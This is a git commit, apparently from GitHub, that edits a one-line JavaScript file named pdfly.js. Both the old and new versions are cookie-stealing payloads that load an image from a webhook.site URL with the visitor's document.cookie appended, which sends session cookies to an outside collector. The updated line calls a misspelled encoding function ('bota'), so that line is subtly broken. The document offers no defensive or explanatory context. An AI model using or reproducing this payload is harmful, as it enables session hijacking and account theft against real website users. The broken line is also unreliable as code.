440cd9dc7fd01c8053632795b070407fabb89bb3
LargeCow <45584884+LargeCow@users.noreply.github.com>
2025-04-02 14:31:25 -0700

    Update pdfly.js

--- pdfly.js
+++ pdfly.js
@@ -1,1 +1,1 @@
-new Image().src="https://webhook.site/ac16a80f-9be3-42b6-aab0-54eca244ab72/?c="+document.cookie;
+x =new Image(); x.src="https://webhook.site/ac16a80f-9be3-42b6-aab0-54eca244ab72/123?c="+bota(document.cookie);
